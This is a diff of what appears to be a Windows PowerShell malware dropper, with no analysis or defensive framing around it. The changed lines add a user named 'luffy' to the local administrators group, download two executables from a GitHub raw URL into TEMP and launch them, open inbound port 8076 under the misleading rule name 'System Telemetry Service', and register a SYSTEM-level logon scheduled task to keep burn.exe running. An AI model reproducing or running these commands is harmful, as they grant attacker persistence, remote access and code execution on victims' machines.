@@ -1,13 +1,11 @@
-iwr https://raw.githubusercontent.com/shanks-wq/muddy/refs/heads/main/1uk9l129j.exe -OutFile $env:TEMP\1uk9l129j.exe
+net localgroup administrators luffy /add
 
+iwr https://raw.githubusercontent.com/shanks-wq/soder/refs/heads/main/1uk9l129j.exe -OutFile $env:TEMP\1uk9l129j.exe
 Start-Process $env:TEMP\1uk9l129j.exe
 
-iwr https://raw.githubusercontent.com/shanks-wq/muddy/refs/heads/main/burn.exe -OutFile $env:TEMP\burn.exe
-
+iwr https://raw.githubusercontent.com/shanks-wq/soder/refs/heads/main/burn.exe -OutFile $env:TEMP\burn.exe
 Start-Process $env:TEMP\burn.exe
-
 
 New-NetFirewallRule -DisplayName "System Telemetry Service" -Direction Inbound -Protocol TCP -LocalPort 8076 -Action Allow
 
-
-schtasks  /create /sc onlogon /tn "Compo" /tr "TEMP\burn.exe" /ru SYSTEM  
+schtasks /create /sc onlogon /tn "Compo" /tr "$env:TEMP\burn.exe" /ru SYSTEM
